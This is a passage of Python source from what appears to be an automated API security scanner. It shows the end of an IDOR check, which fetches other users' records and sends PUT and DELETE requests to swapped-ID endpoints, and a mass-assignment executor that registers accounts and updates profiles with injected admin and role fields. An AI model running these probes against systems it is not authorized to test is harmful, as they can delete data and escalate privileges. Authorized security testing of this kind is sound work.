            if status == 200 and len(body) > 10:
                body_lower = body.lower()
                if any(s in body_lower for s in ['"email"', '"id"', '"username"', '"name"',
                                                  '"data"', '"address"', '"phone"', '"order"']):
                    findings.append({
                        "test": "idor", "original": orig_path, "swapped": swapped_path,
                        "status": status, "body_snippet": body[:256],
                    })

        # PUT/DELETE method tests on first few ID endpoints
        for orig_path, orig_id, swapped_path in id_endpoints[:5]:
            for method in ["PUT", "DELETE"]:
                status, body, _ = self._probe(
                    f"{base}{swapped_path}", method=method,
                    headers={**self._auth_headers(experiment), "Content-Type": "application/json"},
                    data=b'{"id": 99}')
                if status == 200:
                    findings.append({"test": f"idor_{method.lower()}", "path": swapped_path,
                                     "status": status})

        # If no ID endpoints discovered, test generic patterns on the base
        if not id_endpoints:
            for i in range(1, 4):
                status, body, _ = self._probe(f"{base}/api/users/{i}")
                if status == 200 and len(body) > 10:
                    findings.append({"test": "idor_generic", "path": f"/api/users/{i}",
                                     "status": status, "body_snippet": body[:256]})

        evidence = self.collect_evidence({
            "idor_findings": findings, "findings_count": len(findings),
        })
        elapsed = (time.monotonic() - start) * 1000
        return ExecutionResult(status=ExecutionStatus.SUCCESS, evidence=evidence,
                               execution_time_ms=elapsed)


class MassAssignmentExecutor(GenericHTTPExecutor):
    """Test for mass assignment by sending privileged extra fields to
    any discovered user/registration/profile endpoints."""

    PRIV_FIELDS = [
        {"role": "admin"},
        {"isAdmin": True},
        {"admin": True},
        {"permissions": ["admin", "superuser"]},
        {"verified": True, "active": True},
        {"level": "superadmin"},
    ]

    def execute(self, experiment: SecurityExperiment) -> ExecutionResult:
        url = self._url_from_experiment(experiment)
        if not url:
            return ExecutionResult(status=ExecutionStatus.SCHEMA_ERROR,
                                  error_code="NO_URL", error_message="No URL to probe")
        start = time.monotonic()
        base = self._base(experiment)
        findings = []
        ts = int(time.time())

        # 1. Registration — discovered auth/user endpoints
        reg_eps = self._to_paths(
            self._endpoints_by_role(experiment, "auth", "user"), base)
        if not reg_eps:
            reg_eps = ["/api/users", "/api/register", "/api/signup"]
        for ep in reg_eps[:6]:
            for extra in self.PRIV_FIELDS:
                payload = {"email": f"masstest_{ts}@test.com",
                           "password": "Test1234!", "passwordRepeat": "Test1234!",
                           **extra}
                status, body, _ = self._probe(
                    f"{base}{ep}", method="POST",
                    headers={"Content-Type": "application/json", "User-Agent": "AntiGravity-V2/1.0"},
                    data=json.dumps(payload).encode())
                if status in (200, 201):
                    body_lower = body.lower()
                    if any(f'"{k}"' in body_lower for k in extra):
                        findings.append({
                            "test": "mass_assignment_reg", "path": ep,
                            "extra_fields": list(extra.keys()),
                            "status": status, "body_snippet": body[:256],
                        })

        # 2. Profile update — PUT/PATCH on user/config endpoints
        update_eps = self._to_paths(
            self._endpoints_by_role(experiment, "user", "config"), base)
        if not update_eps:
            update_eps = ["/api/profile", "/api/me", "/api/account"]
        for ep in update_eps[:6]:
            for extra in self.PRIV_FIELDS[:3]:
                for method in ["PUT", "PATCH"]:
                    status, body, _ = self._probe(
                        f"{base}{ep}", method=method,
                        headers={"Content-Type": "application/json",
                                 **self._auth_headers(experiment)},
                        data=json.dumps(extra).encode())
                    if status == 200:
                        findings.append({
                            "test": "mass_assignment_update", "path": ep,
                            "method": method, "extra_fields": list(extra.keys()),
                            "status": status,
                        })

        evidence = self.collect_evidence({
            "mass_assignment_findings": findings, "findings_count": len(findings),
        })
        elapsed = (time.monotonic() - start) * 1000
        return ExecutionResult(status=ExecutionStatus.SUCCESS, evidence=evidence,
                               execution_time_ms=elapsed)
